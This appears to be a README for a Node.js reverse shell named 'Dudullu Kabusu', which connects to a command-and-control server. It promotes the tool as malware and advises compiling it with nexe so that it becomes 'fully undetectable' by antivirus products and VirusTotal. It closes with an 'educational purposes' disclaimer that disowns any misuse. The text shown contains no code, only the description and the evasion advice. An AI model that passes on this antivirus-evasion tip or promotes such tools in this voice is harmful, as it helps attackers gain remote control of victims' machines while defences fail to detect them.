# COMPILE IT WITH nexe NPM PACKAGE TO MAKE IT CROSS PLATFROM/FUD

Project Name: Dudullu Kabusu | Nightmare of dudullu.

Dudullu is a hood in turkey that I used to live in.

What is this project? 

This project is a reverse shell/terminal that connects to a CNC made in Node.js

Why Node.js? 

When you make a malware/grabber in Node.js and compile it with nexe, it becomes fully undetectable by most of the popular AVs and Virustotal.

How long it took to make it?

A night with no sleep probably (1-2 hours) 

Why did I make it?

I made it for educational purposes, I am not responsiable for any fraudulent/malicious activies with this source code

YOU HAVE TO MODIFY THIS CODE FOR USAGE
